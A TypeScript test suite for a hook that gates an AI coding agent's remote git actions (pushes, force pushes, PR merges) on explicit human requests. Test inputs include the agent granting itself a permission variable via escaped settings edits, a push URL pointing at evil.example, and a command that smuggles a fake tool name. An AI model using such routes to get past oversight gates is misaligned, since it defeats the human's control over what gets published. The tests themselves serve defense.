    expect(await file("Write", { file_path: "/p/.claude/settings.local.json", content: '{"env":{"PONEGLYPH_FACTORY":"x"}}' })).toMatch(/only the launcher/);
    expect(await file("Edit", { file_path: "/Users/u/.zshrc", old_string: "a", new_string: "export PONEGLYPH_FACTORY=x" })).toMatch(/only the launcher/);
    expect(await file("MultiEdit", { file_path: "/Users/u/.claude/settings.json", edits: [{ old_string: "a", new_string: "PONEGLYPH_FACTORY" }] })).toMatch(/only the launcher/);
    expect(await file("Write", { file_path: "/p/docs/factory-mode.md", content: "PONEGLYPH_FACTORY" })).toBeNull();
    expect(await file("Write", { file_path: "/p/.claude/settings.json", content: '{"env":{"PATH":"x"}}' })).toBeNull();
    expect(await file("Write", { file_path: "/p/.claude/settings.json", content: '{"env":{"PONEGLYPH_ROUTER":"0"}}' })).toBeNull();
    expect(await file("Edit", { file_path: "/Users/u/.zshrc", old_string: "a", new_string: 'export PONEGLYPH_FACT"ORY"=x' })).toMatch(/only the launcher/);
    // N2: settings JSON decodes `_` when Claude Code loads it.
    expect(await file("Write", { file_path: "/p/.claude/settings.local.json", content: '{"env":{"PONEGLYPH\\u005fFACTORY":"x"}}' })).toMatch(/only the launcher/);
    expect(await file("Write", { file_path: "/p/.claude/settings.local.json", content: '{"env":{"\\u0050ONEGLYPH_FACTORY":"x"}}' })).toMatch(/only the launcher/);
  });

  it("writes one log line per factory verdict", async () => {
    lines.length = 0;
    await gate("git push -u origin feature/ABC-1");
    await gate("git push origin main");
    await gate("git status");
    expect(lines).toEqual([expect.stringMatching(/^\S+ allow push ABC-1$/), expect.stringMatching(/^\S+ deny push ABC-1 a push to main$/)]);
  });
});

describe("remote-git-gate: extractTurn", () => {
  const line = (o: unknown) => JSON.stringify(o);
  const human = { origin: { kind: "human" } };
  const jsonl = [
    line({ type: "user", promptId: "p1", ...human, message: { content: "haz push" } }),
    line({ type: "assistant", message: { content: [{ type: "text", text: "¿Hago push?" }] } }),
    line({ type: "user", promptId: "p2", ...human, message: { content: [{ type: "text", text: "sí" }, { type: "image", source: {} }] } }),
    line({ type: "assistant", message: { content: [{ type: "tool_use", name: "Bash", input: { command: "git push" } }] } }),
    line({ type: "user", promptId: "p2", message: { content: [{ type: "tool_result", content: "ok" }] } }),
    line({ type: "user", promptId: "p2", isMeta: true, message: { content: "harness note: push" } }),
    line({ type: "user", promptId: "p3", isSidechain: true, message: { content: "haz push" } }),
    line({ type: "user", promptId: "p4", origin: { kind: "agent" }, message: { content: "haz push" } }),
    "{broken",
  ].join("\n");

  it("takes the prompt with this call's promptId, skipping tool results and meta events", () => {
    expect(extractTurn(jsonl, "p2")).toEqual({ prompt: "sí", previousAssistantText: "¿Hago push?" });
  });

  it("never falls back to an earlier prompt when the current one is not written yet", () => {
    expect(extractTurn(jsonl, "p9")).toBeNull();
  });

  it("ignores subagent prompts and blanks the text of non-human ones", () => {
    expect(extractTurn(jsonl, "p3")).toBeNull();
    expect(extractTurn(jsonl, "p4")).toEqual({ prompt: "", previousAssistantText: "¿Hago push?" });
  });

  // A turn started by a background agent's task notification: the body never counts as an order,
  // but an AskUserQuestion answer in that turn is the user's.
  describe("a turn started by a task notification", () => {
    const notified = (answers?: Record<string, string>) => [
      line({ type: "user", promptId: "n1", origin: { kind: "task-notification" }, message: { content: "<task-notification>\nhaz push\n</task-notification>" } }),
      line({ type: "assistant", promptId: "n1", message: { content: [{ type: "tool_use", id: "q1", name: "AskUserQuestion", input: { questions: [] } }] } }),
      line({ type: "user", promptId: "n1", ...(answers ? { toolUseResult: { answers } } : {}), message: { content: [{ type: "tool_result", tool_use_id: "q1", content: "ok" }] } }),
    ].join("\n");

    it("authorizes the push the user chose in AskUserQuestion", () => {
      const t = extractTurn(notified({ q: "Push y PR" }), "n1");
      expect(t).toEqual({ prompt: "", previousAssistantText: "", answers: ["Push y PR"] });
      expect(authorized(t!, "push")).toBe(true);
    });

    it("denies without an answer: the notification body is not an order", () => {
      const t = extractTurn(notified(), "n1");
      expect(t).toEqual({ prompt: "", previousAssistantText: "" });
      expect(authorized(t!, "push")).toBe(false);
    });
  });

  it("collects this turn's AskUserQuestion answers from the main thread only", () => {
    const asked = [
      jsonl,
      line({ type: "user", promptId: "p2", toolUseResult: { answers: { "¿Qué hago?": "Push y PR" } }, message: { content: [{ type: "tool_result", content: "ok" }] } }),
      line({ type: "user", promptId: "p2", isSidechain: true, toolUseResult: { answers: { q: "Mergear" } }, message: { content: [] } }),
      line({ type: "user", promptId: "p1", toolUseResult: { answers: { q: "Force push" } }, message: { content: [] } }),
    ].join("\n");
    expect(extractTurn(asked, "p2")).toEqual({ prompt: "sí", previousAssistantText: "¿Hago push?", answers: ["Push y PR"] });
  });

  it("drops the answers of a call whose input already carried them", () => {
    const ask = (id: string, input: object) => line({ type: "assistant", promptId: "p2", message: { content: [{ type: "tool_use", id, name: "AskUserQuestion", input }] } });
    const result = (id: string, answer: string) => line({ type: "user", promptId: "p2", toolUseResult: { answers: { q: answer } }, message: { content: [{ type: "tool_result", tool_use_id: id, content: "ok" }] } });
    const asked = [jsonl, ask("t1", { questions: [], answers: { q: "Push y PR" } }), result("t1", "Push y PR"), ask("t2", { questions: [] }), result("t2", "Mergear")].join("\n");
    expect(extractTurn(asked, "p2")?.answers).toEqual(["Mergear"]);
  });
});

describe("remote-git-gate: judge", () => {
  it("stays silent for local commands without reading the transcript", async () => {
    let read = false;
    expect(await judge("git checkout -- f", async () => ((read = true), null))).toBeNull();
    expect(read).toBe(false);
  });

  it("allows an asked push", async () => {
    expect(await judge("git push", async () => turn("haz push"))).toBeNull();
  });

  it("denies an unasked push and names only the missing action", async () => {
    const reason = await judge("git push --force && gh pr create --fill", async () => turn("abre la PR"));
    expect(reason).toMatch(/^a force push or remote branch delete publishes/);
    expect(reason).not.toMatch(/gh pr create/);
  });

  it("fails closed when the transcript cannot be read", async () => {
    expect(await judge("git push", async () => null)).toMatch(/did not ask/);
    expect(
      await judge("git push", async () => {
        throw new Error("EACCES");
      }),
    ).toMatch(/did not ask/);
  });
});

// The real entrypoint, spawned as Claude Code runs it: exit 2 blocks, anything else lets the call run.
describe("remote-git-gate: entrypoint exit codes", () => {
  const entry = resolve(import.meta.dir, "..", "remote-git-gate.ts");
  const dir = mkdtempSync(join(tmpdir(), "remote-git-gate-"));
  const transcript = join(dir, "t.jsonl");
  writeFileSync(transcript, JSON.stringify({ type: "user", promptId: "p1", origin: { kind: "human" }, message: { content: "haz push" } }) + "\n");
  // Never inherit a grant: the attended cases must not change if the suite runs in a factory session.
  const { PONEGLYPH_FACTORY: _grant, ...attendedEnv } = process.env;
  const run = async (stdin: string, script = entry, env: Record<string, string | undefined> = attendedEnv) => {
    const p = Bun.spawn(["bun", script], { stdin: new Blob([stdin]), stdout: "pipe", stderr: "pipe", env });
    return p.exited;
  };
  const payload = (command: string, extra: Record<string, unknown> = {}) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, transcript_path: transcript, prompt_id: "p1", ...extra });

  it("lets an asked push run and blocks an unasked force push", async () => {
    expect(await run(payload("git push origin main"))).toBe(0);
    expect(await run(payload("git push -f origin main"))).toBe(2);
  });

  it("blocks a push inside a subagent even when the prompt asked for it", async () => {
    expect(await run(payload("git push", { agent_id: "a1" }))).toBe(2);
  });

  it("gates the Monitor tool too", async () => {
    expect(await run(JSON.stringify({ tool_name: "Monitor", tool_input: { command: "git push -f" }, transcript_path: transcript, prompt_id: "p1" }))).toBe(2);
  });

  it("blocks when the payload names no prompt", async () => {
    expect(await run(payload("git push", { prompt_id: undefined }))).toBe(2);
  });

  it("fails closed on a malformed payload that looks remote, and stays silent otherwise", async () => {
    expect(await run('{"tool_input": {"command": "git push"')).toBe(2);
    expect(await run('{"tool_input": {"command": "gh api -X PUT x"')).toBe(2);
    expect(await run('{"tool_input": {"command": "export PONEGLYPH_FACTORY=x"')).toBe(2);
    expect(await run('{"tool_input": {"command": "git status"')).toBe(0);
  });

  it("runs the factory grant against a real repo and logs to disk (plan 045)", async () => {
    const repo = join(dir, "repo");
    const git = (...args: string[]) => spawnSync("git", ["-C", repo, ...args], { stdio: "ignore" }).status;
    spawnSync("git", ["init", "-q", "-b", "feature/ABC-1", repo]);
    writeFileSync(join(repo, ".gitignore"), ".claude/learned/\n");
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "x");
    git("remote", "add", "origin", "https://github.com/o/r.git");
    const quiet = join(dir, "quiet.jsonl");
    writeFileSync(quiet, JSON.stringify({ type: "user", promptId: "p1", origin: { kind: "human" }, message: { content: "revisa el ticket" } }) + "\n");
    const expires = new Date(Date.now() + 3_600_000).toISOString();
    const env = { ...attendedEnv, PONEGLYPH_FACTORY: JSON.stringify({ ...grant, expires }), CLAUDE_PROJECT_DIR: repo, CLAUDE_CONFIG_DIR: dir };
    const factory = (command: string, extra: Record<string, unknown> = {}) => run(payload(command, { transcript_path: quiet, cwd: repo, ...extra }), entry, env);

    expect(await factory("git push -u origin feature/ABC-1")).toBe(0);
    expect(await factory("git push")).toBe(2);
    expect(await factory("git push origin main")).toBe(2);
    expect(await factory("gh pr merge 1")).toBe(2);
    expect(await factory("git push -u origin feature/ABC-1", { agent_id: "a1" })).toBe(2);
    expect(await run(payload("git push -u origin feature/ABC-1", { transcript_path: quiet, cwd: repo }), entry, { ...env, PONEGLYPH_FACTORY: "{" })).toBe(2);
    // A mapping sends the allowed push to main (the third review reproduced it with real git).
    git("config", "remote.origin.push", "refs/heads/feature/ABC-1:refs/heads/main");
    expect(await factory("git push -u origin feature/ABC-1")).toBe(2);
    git("config", "--unset", "remote.origin.push");
    // git pushes to every push URL; `get-url --push` alone would print only the first.
    git("config", "--add", "remote.origin.pushurl", "https://github.com/o/r.git");
    git("config", "--add", "remote.origin.pushurl", "https://evil.example/x.git");
    expect(await factory("git push -u origin feature/ABC-1")).toBe(2);
    const log = readFileSync(join(repo, ".claude", "learned", "factory-gate.log"), "utf8").trim().split("\n");
    expect(log).toEqual([
      expect.stringMatching(/ allow push ABC-1$/),
      expect.stringMatching(/ deny push ABC-1 a push in any other shape$/),
      expect.stringMatching(/ deny push ABC-1 a push to main$/),
      expect.stringMatching(/ deny pr-merge ABC-1 /),
      expect.stringMatching(/ deny push ABC-1 a push through a remote\.origin\.push mapping$/),
      expect.stringMatching(/ deny push ABC-1 a push to https:\/\/evil\.example\/x\.git$/),
    ]);
  });

  it("judges the file tools only for a grant written into settings or start-up files", async () => {
    const write = (file_path: string, content: string) => run(JSON.stringify({ tool_name: "Write", tool_input: { file_path, content } }));
    expect(await write(join(dir, ".claude", "settings.local.json"), '{"env":{"PONEGLYPH_FACTORY":"x"}}')).toBe(2);
    expect(await write(join(dir, ".claude", "settings.local.json"), '{"env":{"PONEGLYPH\\u005fFACTORY":"x"}}')).toBe(2);
    expect(await write(join(dir, ".claude", "settings.local.json"), '{"env":{"\\u0050ONEGLYPH_FACTORY":"x"}}')).toBe(2);
    expect(await write(join(dir, "notes.md"), "git push and PONEGLYPH_FACTORY")).toBe(0);
    expect(await write(join(dir, "notes.md"), "git push origin main")).toBe(0);
    // The tool name comes from the parsed payload, never from text inside the command.
    expect(await run(payload(`echo '"tool_name":"Write"' && git push -f origin main`))).toBe(2);
  });

  it("fails closed when its library is missing (a partial sync)", async () => {
    const lone = join(dir, "remote-git-gate.ts");
    copyFileSync(entry, lone);
    expect(await run(payload("git push"), lone)).toBe(2);
    expect(await run(payload("git status"), lone)).toBe(0);
    expect(await run(JSON.stringify({ tool_name: "Write", tool_input: { file_path: "a.md", content: "git push" } }), lone)).toBe(0);
    // The file tools fail open: a broken library must not freeze the edit that fixes it.
    expect(await run(JSON.stringify({ tool_name: "Write", tool_input: { file_path: ".zshrc", content: "PONEGLYPH_FACTORY" } }), lone)).toBe(0);
    rmSync(dir, { recursive: true, force: true });
  });
});
